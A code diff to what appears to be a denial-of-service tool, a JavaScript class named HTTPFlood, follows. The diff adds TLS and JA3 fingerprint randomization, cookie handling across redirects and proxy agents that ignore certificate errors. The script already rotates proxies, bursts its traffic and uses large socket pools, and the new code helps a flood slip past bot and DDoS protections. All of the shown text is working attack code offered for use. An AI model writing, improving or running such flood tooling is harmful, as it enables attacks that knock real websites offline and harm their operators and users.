@@ -63,7 +63,8 @@ ${colors.cyan}${colors.bright}
 ║  ${colors.green}${icons.success} Adaptive Concurrency${colors.cyan}     ${colors.green}${icons.success} HTTP/2 Support${colors.cyan}                  ║
 ║  ${colors.green}${icons.success} Weighted Proxy Select${colors.cyan}    ${colors.green}${icons.success} Session Emulation${colors.cyan}               ║
 ║  ${colors.green}${icons.success} Pattern Rotation${colors.cyan}         ${colors.green}${icons.success} Exponential Backoff${colors.cyan}             ║
-║  ${colors.green}${icons.success} Random POST Bodies${colors.cyan}       ${colors.green}${icons.success} Cookie Tracking${colors.cyan}                 ║
+║  ${colors.green}${icons.success} Random POST Bodies${colors.cyan}       ${colors.green}${icons.success} TLS Fingerprinting${colors.cyan}              ║
+║  ${colors.green}${icons.success} Cookie Redirect Tracking${colors.cyan} ${colors.green}${icons.success} JA3 Randomization${colors.cyan}               ║
 ║                                                                  ║
 ╚══════════════════════════════════════════════════════════════════╝
 ${colors.reset}
@@ -319,9 +320,28 @@ function createTLSAgent(profile, proxyUrl = null) {
     
     let agent;
     if (proxyUrl) {
-        agent = proxyUrl.startsWith('https') 
-            ? new HttpsProxyAgent(proxyUrl, tlsOptions)
-            : new HttpProxyAgent(proxyUrl);
+        // For HTTPS proxies, pass TLS options for target connection
+        const proxyOptions = {
+            rejectUnauthorized: false,
+            keepAlive: true,
+            keepAliveMsecs: 1000,
+            maxSockets: 1024,
+            maxFreeSockets: 512,
+            timeout: 5000
+        };
+        
+        if (proxyUrl.startsWith('https')) {
+            agent = new HttpsProxyAgent(proxyUrl, {
+                ...proxyOptions,
+                // TLS options for connection to target through proxy
+                ...tlsOptions
+            });
+        } else {
+            // HTTP proxy - TLS options apply to target connection
+            agent = new HttpProxyAgent(proxyUrl, proxyOptions);
+            // Store TLS options separately for target connection
+            agent.tlsOptions = tlsOptions;
+        }
     } else {
         agent = new https.Agent(tlsOptions);
     }
@@ -882,8 +902,9 @@ class HTTPFlood {
         console.log(`${colors.yellow}${icons.fire} Pattern: ${colors.bright}Rotating${colors.reset}${colors.yellow} (burst→steady→mixed, 30s cycles)${colors.reset}`);
         console.log(`${colors.magenta}${icons.check} Proxies: ${colors.bright}Weighted selection${colors.reset}${colors.magenta} (best 3x more likely)${colors.reset}`);
         console.log(`${colors.blue}${icons.info} Recovery: ${colors.bright}Exponential backoff${colors.reset}${colors.blue} + 30s temp bans${colors.reset}`);
-        console.log(`${colors.cyan}${icons.success} Session: ${colors.bright}Cookie tracking${colors.reset}${colors.cyan} + realistic navigation${colors.reset}`);
-        console.log(`${colors.green}${icons.info} Protocol: ${colors.bright}HTTP/1.1 + HTTP/2${colors.reset}${colors.green} (${config.proxies.length > 0 ? '10000' : '5000'}ms timeout)${colors.reset}`);
+        console.log(`${colors.cyan}${icons.success} Session: ${colors.bright}Cookie tracking${colors.reset}${colors.cyan} + 10 redirects + realistic navigation${colors.reset}`);
+        console.log(`${colors.green}${icons.info} Protocol: ${colors.bright}HTTP/1.1 + HTTP/2${colors.reset}${colors.green} with TLS fingerprinting${colors.reset}`);
+        console.log(`${colors.magenta}${icons.check} Fingerprint: ${colors.bright}${profile.name}${colors.reset}${colors.magenta} (randomized per thread)${colors.reset}`);
         console.log(`${colors.yellow}${icons.check} Connection: ${colors.bright}${config.proxies.length > 0 ? '2048' : '1024'} socket pool${colors.reset}${colors.yellow} + Keep-Alive${colors.reset}`);
         
         const baseRPS = config.proxies.length > 0 ? 250 : 500;
@@ -971,9 +992,15 @@ class HTTPFlood {
                 if (useProxy) {
                     if (proxyIndex !== lastProxyIndex || !cachedAgent) {
                         const proxy = config.proxies[proxyIndex];
-                        // Choose agent based on target protocol, not proxy protocol
-                        const agentOptions = {
+                        
+                        // Create agent with TLS fingerprinting for target
+                        const agentTlsOptions = {
                             rejectUnauthorized: false,
+                            ciphers: profile.tls.ciphers,
+                            minVersion: profile.tls.minVersion,
+                            maxVersion: profile.tls.maxVersion,
+                            ecdhCurve: profile.tls.ecdhCurve,
+                            honorCipherOrder: true,
                             keepAlive: true,
                             keepAliveMsecs: 1000,
                             maxSockets: 2048,
@@ -981,10 +1008,24 @@ class HTTPFlood {
                             timeout: 10000
                         };
                         
+                        if (profile.tls.sigalgs) {
+                            agentTlsOptions.sigalgs = profile.tls.sigalgs;
+                        }
+                        
                         cachedAgent = isHttpsTarget
-                            ? new HttpsProxyAgent(proxy, agentOptions)
-                            : new HttpProxyAgent(proxy, agentOptions);
+                            ? new HttpsProxyAgent(proxy, agentTlsOptions)
+                            : new HttpProxyAgent(proxy, { 
+                                keepAlive: true,
+                                maxSockets: 2048,
+                                maxFreeSockets: 1024,
+                                timeout: 10000 
+                              });
                         lastProxyIndex = proxyIndex;
+                    }
+                } else {
+                    // Direct connection - create TLS agent with fingerprint
+                    if (!cachedAgent) {
+                        cachedAgent = createTLSAgent(profile, null);
                     }
                 }
                 
@@ -993,9 +1034,30 @@ class HTTPFlood {
                     url: targetUrl,
                     headers,
                     timeout: useProxy ? 10000 : 5000,
-                    maxRedirects: 3,
+                    maxRedirects: 10, // Follow all redirects
                     validateStatus: () => true,
-                    decompress: true
+                    decompress: true,
+                    // Preserve cookies across redirects
+                    withCredentials: true,
+                    // Follow redirects and maintain session
+                    beforeRedirect: (options, responseDetails) => {
+                        // Preserve cookies on redirect
+                        if (responseDetails.headers['set-cookie']) {
+                            const cookies = Array.isArray(responseDetails.headers['set-cookie'])
+                                ? responseDetails.headers['set-cookie']
+                                : [responseDetails.headers['set-cookie']];
+                            cookies.forEach(cookie => {
+                                const [pair] = cookie.split(';');
+                                const [key, value] = pair.split('=');
+                                if (key && value) cookieJar[key.trim()] = value.trim();
+                            });
+                            
+                            // Add cookies to redirect request
+                            options.headers['Cookie'] = Object.entries(cookieJar)
+                                .map(([k, v]) => `${k}=${v}`)
+                                .join('; ');
+                        }
+                    }
                 };
                 
                 if (useProxy && cachedAgent) {
